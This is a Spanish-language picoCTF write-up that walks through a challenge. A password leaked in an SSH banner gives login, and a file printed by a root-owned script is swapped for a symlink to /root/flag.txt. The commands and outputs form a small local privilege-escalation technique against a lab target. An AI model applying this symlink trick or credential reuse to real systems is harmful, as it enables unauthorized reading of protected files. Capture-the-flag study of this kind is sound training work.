#### Description

Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 58964`. Use the leaked information to get to the server. To connect to the running application use `nc tethys.picoctf.net 51318`. From the above information abuse the machine and find the flag in the /root directory.

Se intenta conectar al servicio:

```bash
nc tethys.picoctf.net 58964
```

Output:

```
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```
## Acceso al servicio principal

Se conecta al servicio interactivo:

```bash
nc tethys.picoctf.net 51318
```

Se responde:

```
Password: My_Passw@rd_@1234
Conference: DEFCON
Hacker: JOHN DRAPER
```

Se listan archivos:

```bash
ls
```

Output:

```
banner  text
```

Se revisa:

```bash
cat text
```

Output:

```
keep digging
```

Se accede a `/root`:

```bash
cd /root
ls
```

Output:

```
flag.txt  script.py
```

No se puede leer la flag:

```bash
cat flag.txt
```

```
Permission denied
```

---

Se revisa el archivo:

```bash
cat script.py
```

Fragmento importante:

```python
with open("/home/player/banner", "r") as f:
    print(f.read())
```

### Explicación clave

- El programa lee el archivo:

```
/home/player/banner
```

- Y lo imprime sin validación

Se elimina el archivo original:

```bash
rm banner
```

Se crea un enlace simbólico:

```bash
ln -s /root/flag.txt banner
```

### Explicación

- `ln -s` crea un **symlink**
    
- `banner` ahora apunta a `/root/flag.txt`
    
 Cuando el programa lea `banner`, en realidad leerá la flag

---

## Ejecución final

Se vuelve a ejecutar el servicio y saldrá la flag:

```bash
nc tethys.picoctf.net 51318
```
